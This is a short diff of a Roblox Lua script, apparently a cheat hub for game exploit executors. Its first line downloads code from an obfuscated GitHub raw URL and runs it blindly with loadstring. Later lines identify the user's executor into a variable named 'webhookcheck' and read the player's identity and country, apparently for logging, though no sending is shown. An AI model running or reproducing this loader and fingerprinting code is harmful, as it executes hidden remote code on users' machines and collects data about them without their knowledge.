@@ -1,4 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/pzah7549607hw98hasd89/sigzta87h67892z5h6039h7haf/main/gjasd98j634509t7jg0a9s"))()
+getfenv().TomorrowsHubMainStore.Players = 0
 local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Unknown Exploit"
 local plr = game:GetService("Players").LocalPlayer
 local country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(plr)
